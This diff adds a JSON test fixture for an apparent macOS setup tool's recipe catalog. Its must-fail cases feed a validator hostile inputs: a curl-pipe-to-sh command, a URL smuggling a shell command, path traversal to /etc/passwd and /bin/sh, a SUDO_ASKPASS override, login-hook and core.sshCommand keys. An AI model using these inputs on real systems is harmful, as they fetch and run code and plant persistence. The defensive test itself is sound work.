@@ -1,0 +1,427 @@
+{
+  "_prototype": "catalog holds every hard case from ticket #12 and must pass the schema and lint. mustFailSchema and mustFailLint each make one change to a recipe in catalog, so that change is the only reason it can fail. URLs and checksums were read from the vendors on 2026-11-06; nothing was installed.",
+  "catalog": {
+    "schemaVersion": 1,
+    "recipes": [
+      {
+        "id": "command-line-tools",
+        "kind": "cli",
+        "title": "Command Line Tools",
+        "base": true,
+        "checks": [{ "type": "builtin", "name": "command-line-tools" }],
+        "steps": [{ "type": "builtin", "name": "command-line-tools", "admin": true }]
+      },
+      {
+        "id": "homebrew",
+        "kind": "cli",
+        "title": "Homebrew",
+        "base": true,
+        "requires": ["command-line-tools"],
+        "checks": [{ "type": "builtin", "name": "homebrew" }],
+        "steps": [
+          {
+            "type": "pkg-install",
+            "url": "https://github.com/Homebrew/brew/releases/download/7.0.12/Homebrew.pkg",
+            "sha256": "a9825310dce8d94bc97f70140700089183c3a894b1048501d933865d7c2441bd",
+            "signedBy": "927JGANW46"
+          }
+        ]
+      },
+      {
+        "id": "gh",
+        "kind": "cli",
+        "title": "GitHub CLI",
+        "base": true,
+        "requires": ["homebrew"],
+        "bootstrap": {
+          "version": "2.103.3",
+          "url": "https://github.com/cli/cli/releases/download/v2.103.3/gh_2.103.3_macOS_arm64.zip",
+          "sha256": "d700207eae9ae98fe2b89535c2c087c07823d4628c56364695a5a07ef311c062",
+          "signedBy": "VEKTX9H2N7",
+          "binary": "gh_2.103.3_macOS_arm64/bin/gh"
+        },
+        "checks": [
+          { "type": "brew-formula", "name": "gh" },
+          { "type": "builtin", "name": "gh-handed-off" }
+        ],
+        "facts": [
+          { "id": "signed-in", "label": "Signed in to GitHub", "probe": { "type": "builtin", "name": "github-signed-in" } }
+        ],
+        "steps": [
+          { "type": "brew-formula", "name": "gh" },
+          { "type": "builtin", "name": "gh-hand-off" }
+        ]
+      },
+
+      {
+        "id": "ghostty",
+        "kind": "app",
+        "title": "Ghostty",
+        "requires": ["homebrew"],
+        "checks": [{ "type": "brew-cask", "name": "ghostty" }],
+        "steps": [{ "type": "brew-cask", "name": "ghostty" }]
+      },
+      {
+        "id": "aerospace",
+        "kind": "app",
+        "title": "AeroSpace",
+        "requires": ["homebrew"],
+        "checks": [{ "type": "brew-cask", "name": "nikitabobko/tap/aerospace" }],
+        "facts": [
+          {
+            "id": "accessibility",
+            "label": "Accessibility permission",
+            "probe": { "type": "unknowable", "reason": "macOS 27 doesn't let apps read the privacy database." }
+          }
+        ],
+        "steps": [
+          { "type": "brew-cask", "name": "nikitabobko/tap/aerospace" },
+          {
+            "type": "needs-you",
+            "id": "grant-accessibility",
+            "text": "Allow AeroSpace under Accessibility in System Settings.",
+            "link": "x-apple.systempreferences:com.apple.settings.PrivacySecurity.extension?Privacy_Accessibility",
+            "completion": { "confirm": true }
+          }
+        ]
+      },
+      {
+        "id": "maestro",
+        "kind": "cli",
+        "title": "Maestro",
+        "requires": ["homebrew"],
+        "checks": [{ "type": "brew-formula", "name": "mobile-dev-inc/tap/maestro" }],
+        "steps": [{ "type": "brew-formula", "name": "mobile-dev-inc/tap/maestro" }]
+      },
+
+      {
+        "id": "kotlin-lsp",
+        "kind": "cli",
+        "title": "Kotlin Language Server",
+        "checks": [
+          { "type": "managed-tool", "tool": "kotlin-lsp", "version": "263.7084.0", "file": "kotlin-server-263.7084.0/build.txt" },
+          { "type": "tool-version", "path": "~/.local/bin/kotlin-lsp", "flag": "--version" }
+        ],
+        "steps": [
+          {
+            "type": "download",
+            "tool": "kotlin-lsp",
+            "version": "263.7084.0",
+            "url": "https://download.jetbrains.com/language-server/kotlin-server/263.7084.0/kotlin-server-263.7084.0-aarch64.sit",
+            "sha256": "b403bf8a54bd458e3ba6731cf8abb3340be08b439c03576dfc02b13faf3694b8",
+            "archive": "zip",
+            "signedBy": "2ZEFAR8TH3",
+            "signedFile": "kotlin-server-263.7084.0/bin/intellij-server",
+            "links": [{ "name": "kotlin-lsp", "target": "kotlin-server-263.7084.0/bin/intellij-server" }]
+          }
+        ],
+        "notes": ["Installed under Soulcaster's tools folder, no longer inside /opt/homebrew."]
+      },
+
+      {
+        "id": "openjdk",
+        "kind": "cli",
+        "title": "OpenJDK",
+        "requires": ["homebrew"],
+        "checks": [{ "type": "brew-formula", "name": "openjdk" }],
+        "steps": [{ "type": "brew-formula", "name": "openjdk" }]
+      },
+      {
+        "id": "android-sdk",
+        "kind": "cli",
+        "title": "Android SDK",
+        "requires": ["homebrew", "openjdk"],
+        "checks": [
+          { "type": "brew-cask", "name": "android-commandlinetools" },
+          { "type": "file", "path": "~/Library/Android/sdk/platform-tools/package.xml" },
+          { "type": "file", "path": "~/Library/Android/sdk/platforms/android-35/package.xml" },
+          { "type": "file", "path": "~/Library/Android/sdk/build-tools/35.0.0/package.xml" }
+        ],
+        "steps": [
+          { "type": "brew-cask", "name": "android-commandlinetools" },
+          {
+            "type": "accept-license",
+            "id": "android-licenses",
+            "license": "android-sdk",
+            "text": "Read and accept the Android SDK licenses.",
+            "link": "https://developer.android.com/studio/terms",
+            "unless": { "type": "file", "path": "~/Library/Android/sdk/licenses/android-sdk-license" }
+          },
+          {
+            "type": "sdkmanager",
+            "packages": [
+              { "literal": "platform-tools" },
+              { "literal": "platforms;android-35" },
+              { "literal": "build-tools;35.0.0" }
+            ]
+          }
+        ]
+      },
+      {
+        "id": "android-emulator",
+        "kind": "cli",
+        "title": "Android emulator",
+        "requires": ["android-sdk"],
+        "checks": [{ "type": "file", "path": "~/Library/Android/sdk/emulator/package.xml" }],
+        "steps": [{ "type": "sdkmanager", "packages": [{ "literal": "emulator" }] }]
+      },
+
+      {
+        "id": "tailscale",
+        "kind": "app",
+        "title": "Tailscale",
+        "requires": ["homebrew"],
+        "conflicts": [
+          {
+            "probe": { "type": "app-bundle", "bundleId": "io.tailscale.ipn.macos", "path": "/Applications/Tailscale.app" },
+            "message": "The App Store copy of Tailscale is installed. Remove it first, because the installer would stop to ask."
+          },
+          {
+            "probe": { "type": "brew-formula", "name": "tailscale" },
+            "message": "The Homebrew tailscale formula is installed. Remove it first, because the installer would stop to ask."
+          }
+        ],
+        "checks": [
+          { "type": "brew-cask", "name": "tailscale-app" },
+          { "type": "pkg-receipt", "pkgId": "com.tailscale.ipn.macsys" }
+        ],
+        "steps": [{ "type": "brew-cask", "name": "tailscale-app", "admin": true }],
+        "notes": ["Installed only. Open Tailscale to approve its system extension and sign in."]
+      },
+
+      {
+        "id": "xcode",
+        "kind": "app",
+        "title": "Xcode",
+        "minMacOS": "26.6",
+        "checks": [
+          { "type": "app-bundle", "bundleId": "com.apple.dt.Xcode", "path": "/Applications/Xcode.app" },
+          { "type": "builtin", "name": "xcode-ready" }
+        ],
+        "facts": [
+          {
+            "id": "app-store-sign-in",
+            "label": "Signed in to the App Store",
+            "probe": { "type": "unknowable", "reason": "Neither mas nor Apple's tools can report this." }
+          },
+          {
+            "id": "xcode-account",
+            "label": "Apple Account added in Xcode",
+            "probe": { "type": "unknowable", "reason": "No documented command reports this." }
+          }
+        ],
+        "steps": [
+          {
+            "type": "needs-you",
+            "id": "get-xcode",
+            "text": "Sign in to the App Store with your Apple Account and click Get on Xcode. This can take a while.",
+            "link": "macappstore://apps.apple.com/app/id497799835",
+            "completion": {
+              "until": { "type": "app-bundle", "bundleId": "com.apple.dt.Xcode", "path": "/Applications/Xcode.app" }
+            },
+            "unless": { "type": "app-bundle", "bundleId": "com.apple.dt.Xcode", "path": "/Applications/Xcode.app" }
+          },
+          {
+            "type": "accept-license",
+            "id": "xcode-license",
+            "license": "xcode",
+            "admin": true,
+            "text": "Read and accept the Xcode license.",
+            "link": "https://www.apple.com/legal/sla/",
+            "unless": { "type": "builtin", "name": "xcode-ready" }
+          },
+          {
+            "type": "builtin",
+            "name": "xcode-first-launch",
+            "admin": true,
+            "unless": { "type": "builtin", "name": "xcode-ready" }
+          }
+        ]
+      },
+
+      {
+        "id": "junie",
+        "kind": "cli",
+        "title": "Junie",
+        "requires": ["homebrew"],
+        "checks": [{ "type": "brew-cask", "name": "junie" }],
+        "facts": [
+          {
+            "id": "signed-in",
+            "label": "Signed in",
+            "probe": { "type": "unknowable", "reason": "Junie has no documented sign-in check." }
+          }
+        ],
+        "steps": [{ "type": "brew-cask", "name": "junie" }],
+        "notes": ["Installed only. Sign in when you first open it."]
+      },
+      {
+        "id": "claude-code",
+        "kind": "cli",
+        "title": "Claude Code",
+        "requires": ["homebrew"],
+        "checks": [{ "type": "brew-cask", "name": "claude-code" }],
+        "facts": [
+          {
+            "id": "signed-in",
+            "label": "Signed in",
+            "probe": { "type": "unknowable", "reason": "Agent CLIs are install-only, so Soulcaster doesn't run them to check." }
+          }
+        ],
+        "steps": [{ "type": "brew-cask", "name": "claude-code" }],
+        "notes": ["Installed only. Sign in when you first open it."]
+      },
+
+      {
+        "id": "dock.autohide",
+        "kind": "setting",
+        "title": "Automatically hide the Dock",
+        "valueType": "boolean",
+        "unsetMeans": false,
+        "stores": [{ "type": "defaults", "domain": "com.apple.dock", "key": "autohide", "storedType": "bool" }],
+        "effect": "restart-dock",
+        "evidence": { "group": "documented", "confirmedOn": [] }
+      },
+      {
+        "id": "dock.position",
+        "kind": "setting",
+        "title": "Dock position",
+        "valueType": "string",
+        "values": ["bottom", "left", "right"],
+        "unsetMeans": "bottom",
+        "stores": [{ "type": "defaults", "domain": "com.apple.dock", "key": "orientation", "storedType": "string" }],
+        "effect": "restart-dock",
+        "evidence": { "group": "documented", "confirmedOn": [] }
+      },
+      {
+        "id": "trackpad.tap-to-click",
+        "kind": "setting",
+        "title": "Tap to click",
+        "valueType": "boolean",
+        "stores": [
+          {
+            "type": "defaults",
+            "domain": "com.apple.AppleMultitouchTrackpad",
+            "key": "Clicking",
+            "storedType": "int",
+            "encode": { "true": 1, "false": 0 }
+          },
+          {
+            "type": "defaults",
+            "domain": "com.apple.driver.AppleBluetoothMultitouch.trackpad",
+            "key": "Clicking",
+            "storedType": "int",
+            "encode": { "true": 1, "false": 0 }
+          }
+        ],
+        "effect": "log-out",
+        "evidence": { "group": "probable", "confirmedOn": [] }
+      },
+      {
+        "id": "menu-bar.show-spotlight",
+        "kind": "setting",
+        "title": "Show Spotlight in the menu bar",
+        "valueType": "boolean",
+        "stores": [
+          {
+            "type": "defaults",
+            "domain": "com.apple.Spotlight",
+            "key": "MenuItemHidden",
+            "storedType": "bool",
+            "encode": { "true": false, "false": true }
+          }
+        ],
+        "effect": "restart-controlcenter",
+        "evidence": { "group": "unconfirmed", "confirmedOn": [] }
+      },
+      {
+        "id": "menu-bar.extras",
+        "kind": "setting",
+        "title": "Menu bar extras",
+        "valueType": "string-list",
+        "stores": [{ "type": "defaults", "domain": "com.apple.systemuiserver", "key": "menuExtras", "storedType": "string-array" }],
+        "effect": "restart-systemuiserver",
+        "evidence": { "group": "broken", "confirmedOn": [] },
+        "notes": ["Skipped: most of these paths no longer exist on macOS 27."]
+      },
+
+      {
+        "id": "keyboard.key-repeat",
+        "kind": "setting",
+        "title": "Key repeat rate",
+        "valueType": "integer",
+        "minimum": 1,
+        "maximum": 120,
+        "stores": [{ "type": "defaults", "domain": "NSGlobalDomain", "key": "KeyRepeat", "storedType": "int" }],
+        "effect": "log-out",
+        "evidence": { "group": "probable", "confirmedOn": [] }
+      },
+
+      {
+        "id": "git.default-branch",
+        "kind": "setting",
+        "title": "Default Git branch",
+        "valueType": "string",
+        "pattern": "^[A-Za-z0-9._/-]+$",
+        "requires": ["command-line-tools"],
+        "stores": [{ "type": "git-config", "key": "init.defaultBranch" }],
+        "evidence": { "group": "documented", "confirmedOn": [] }
+      },
+      {
+        "id": "git-identity",
+        "kind": "machine-values",
+        "title": "Git identity",
+        "requires": ["command-line-tools"],
+        "values": [
+          { "name": "git.user.name", "label": "Name for Git commits", "store": { "type": "git-config", "key": "user.name" } },
+          { "name": "git.user.email", "label": "Email for Git commits", "store": { "type": "git-config", "key": "user.email" } }
+        ]
+      }
+    ]
+  },
+
+  "mustFailSchema": [
+    { "name": "shell-command-field", "why": "A recipe can't carry a shell command.", "from": "ghostty", "patch": [{ "op": "add", "path": "/postInstall", "value": "curl -fsSL https://example.com/x.sh | sh" }] },
+    { "name": "shell-step-type", "why": "No step type runs a command.", "from": "ghostty", "patch": [{ "op": "replace", "path": "/steps/0", "value": { "type": "shell", "command": "brew install --cask ghostty" } }] },
+    { "name": "extra-arguments", "why": "Steps have no argument list.", "from": "ghostty", "patch": [{ "op": "add", "path": "/steps/0/args", "value": ["--no-quarantine"] }] },
+    { "name": "environment-variables", "why": "A recipe can't set the environment, including SUDO_ASKPASS.", "from": "maestro", "patch": [{ "op": "add", "path": "/steps/0/env", "value": { "SUDO_ASKPASS": "/tmp/helper" } }] },
+    { "name": "flag-as-package-name", "why": "A name can't be read as a flag.", "from": "ghostty", "patch": [{ "op": "replace", "path": "/steps/0/name", "value": "--force" }] },
+    { "name": "second-spelling-of-core", "why": "A bare name is the only spelling of an official package.", "from": "openjdk", "patch": [{ "op": "replace", "path": "/steps/0/name", "value": "homebrew/core/openjdk" }] },
+    { "name": "download-without-checksum", "why": "Every download needs a SHA-256.", "from": "kotlin-lsp", "patch": [{ "op": "remove", "path": "/steps/0/sha256" }] },
+    { "name": "download-without-signer", "why": "Every download needs an expected signer.", "from": "kotlin-lsp", "patch": [{ "op": "remove", "path": "/steps/0/signedBy" }] },
+    { "name": "download-over-http", "why": "Downloads are HTTPS only.", "from": "kotlin-lsp", "patch": [{ "op": "replace", "path": "/steps/0/url", "value": "http://download.jetbrains.com/kotlin-server.sit" }] },
+    { "name": "url-carrying-a-command", "why": "A URL has no query or shell characters.", "from": "kotlin-lsp", "patch": [{ "op": "replace", "path": "/steps/0/url", "value": "https://example.com/x.zip;curl${IFS}example.com|sh" }] },
+    { "name": "download-chooses-its-destination", "why": "Only the engine picks where a tool goes.", "from": "kotlin-lsp", "patch": [{ "op": "add", "path": "/steps/0/installTo", "value": "/etc/periodic/daily" }] },
+    { "name": "link-escaping-the-tool", "why": "A link target stays inside the tool's folder.", "from": "kotlin-lsp", "patch": [{ "op": "replace", "path": "/steps/0/links/0/target", "value": "../../../../../bin/sh" }] },
+    { "name": "version-check-runs-a-shell", "why": "tool-version takes one fixed flag.", "from": "kotlin-lsp", "patch": [{ "op": "replace", "path": "/checks/1", "value": { "type": "tool-version", "path": "~/.local/bin/kotlin-lsp", "flag": "-c" } }] },
+    { "name": "version-check-outside-allowed-roots", "why": "A check can't run system programs.", "from": "kotlin-lsp", "patch": [{ "op": "replace", "path": "/checks/1", "value": { "type": "tool-version", "path": "/bin/sh", "flag": "--version" } }] },
+    { "name": "path-climbing-out", "why": "A path can't climb out of its root.", "from": "android-sdk", "patch": [{ "op": "replace", "path": "/checks/1", "value": { "type": "file", "path": "~/../../etc/passwd" } }] },
+    { "name": "third-party-cask-as-admin", "why": "Third-party tap code never runs while the helper is live.", "from": "aerospace", "patch": [{ "op": "add", "path": "/steps/0/admin", "value": true }] },
+    { "name": "git-key-that-runs-programs", "why": "core.sshCommand would run a program.", "from": "git.default-branch", "patch": [{ "op": "replace", "path": "/stores/0/key", "value": "core.sshCommand" }] },
+    { "name": "git-alias", "why": "An alias can run a program.", "from": "git.default-branch", "patch": [{ "op": "replace", "path": "/stores/0/key", "value": "alias.x" }] },
+    { "name": "defaults-outside-allowed-domains", "why": "A recipe can't write login hooks.", "from": "dock.autohide", "patch": [{ "op": "replace", "path": "/stores/0", "value": { "type": "defaults", "domain": "com.apple.loginwindow", "key": "LoginHook", "storedType": "string" } }] },
+    { "name": "windowserver-warning-domain", "why": "com.apple.spaces stays out until the macOS 26 warning is cleared.", "from": "dock.autohide", "patch": [{ "op": "replace", "path": "/stores/0", "value": { "type": "defaults", "domain": "com.apple.spaces", "key": "spans-displays", "storedType": "bool" } }] },
+    { "name": "restart-cfprefsd", "why": "Restarts are a closed list.", "from": "dock.autohide", "patch": [{ "op": "replace", "path": "/effect", "value": "restart-cfprefsd" }] },
+    { "name": "setting-without-evidence", "why": "A setting must say how much its read-back proves.", "from": "dock.autohide", "patch": [{ "op": "remove", "path": "/evidence" }] },
+    { "name": "setting-without-read-path", "why": "A setting with no read path can't show Drift.", "from": "dock.autohide", "patch": [{ "op": "remove", "path": "/stores" }] },
+    { "name": "integer-setting-without-bounds", "why": "An integer setting must say what's in range, so -5 can't be written.", "from": "keyboard.key-repeat", "patch": [{ "op": "remove", "path": "/minimum" }] },
+    { "name": "builtin-store-outside-the-list", "why": "Builtin read and write paths are a closed list.", "from": "dock.autohide", "patch": [{ "op": "replace", "path": "/stores/0", "value": { "type": "builtin", "name": "run-anything" } }] },
+    { "name": "second-spelling-of-a-tap", "why": "jetbrains/homebrew-junie and jetbrains/junie are one tap, so only the short form is valid.", "from": "aerospace", "patch": [{ "op": "replace", "path": "/steps/0/name", "value": "nikitabobko/homebrew-tap/aerospace" }] },
+    { "name": "item-without-read-path", "why": "An Item with no checks can't be verified.", "from": "ghostty", "patch": [{ "op": "replace", "path": "/checks", "value": [] }] },
+    { "name": "needs-you-file-link", "why": "A person link can't open a local file or run a script.", "from": "aerospace", "patch": [{ "op": "replace", "path": "/steps/1/link", "value": "file:///tmp/run-me.command" }] },
+    { "name": "unknown-builtin", "why": "Builtins are a closed list.", "from": "xcode", "patch": [{ "op": "replace", "path": "/steps/2/name", "value": "run-anything" }] },
+    { "name": "bootstrap-on-a-selected-item", "why": "Only base Items may bypass Homebrew.", "from": "ghostty", "patch": [{ "op": "add", "path": "/bootstrap", "value": { "version": "1.0.0", "url": "https://example.com/g.zip", "sha256": "d700207eae9ae98fe2b89535c2c087c07823d4628c56364695a5a07ef311c062", "signedBy": "VEKTX9H2N7", "binary": "bin/g" } }] }
+  ],
+
+  "mustFailLint": [
+    { "name": "unknown-requirement", "why": "Every requirement must exist.", "from": "ghostty", "patch": [{ "op": "add", "path": "/requires/-", "value": "not-a-real-item" }] },
+    { "name": "requirement-cycle", "why": "Requirements can't loop.", "from": "homebrew", "patch": [{ "op": "add", "path": "/requires/-", "value": "gh" }] },
+    { "name": "brew-without-homebrew", "why": "A brew step must require homebrew.", "from": "ghostty", "patch": [{ "op": "remove", "path": "/requires/0" }] },
+    { "name": "git-without-command-line-tools", "why": "/usr/bin/git is a stub until Command Line Tools exist.", "from": "git-identity", "patch": [{ "op": "remove", "path": "/requires/0" }] },
+    { "name": "admin-item-needing-a-user-item", "why": "It would have to wait for a stage that runs after the password is gone. This is the mas route for Xcode.", "from": "xcode", "patch": [{ "op": "add", "path": "/requires", "value": ["openjdk"] }] },
+    { "name": "pkg-install-in-a-third-party-recipe", "why": "An Item that loads tap code can't also use the helper.", "from": "maestro", "patch": [{ "op": "add", "path": "/steps/-", "value": { "type": "pkg-install", "url": "https://example.com/x.pkg", "sha256": "d700207eae9ae98fe2b89535c2c087c07823d4628c56364695a5a07ef311c062", "signedBy": "VEKTX9H2N7" } }] },
+    { "name": "pattern-with-lookahead", "why": "Setting patterns must compile under Rust's plain regex crate.", "from": "git.default-branch", "patch": [{ "op": "replace", "path": "/pattern", "value": "^(?!-)[A-Za-z0-9._/-]+$" }] },
+    { "name": "broken-setting-marked-confirmed", "why": "Broken and confirmed can't both be true.", "from": "menu-bar.extras", "patch": [{ "op": "replace", "path": "/evidence/confirmedOn", "value": ["27.2"] }] },
+    { "name": "second-base-with-bootstrap", "why": "Only gh bypasses Homebrew.", "from": "homebrew", "patch": [{ "op": "add", "path": "/bootstrap", "value": { "version": "1.0.0", "url": "https://example.com/b.zip", "sha256": "d700207eae9ae98fe2b89535c2c087c07823d4628c56364695a5a07ef311c062", "signedBy": "VEKTX9H2N7", "binary": "bin/b" } }] }
+  ]
+}
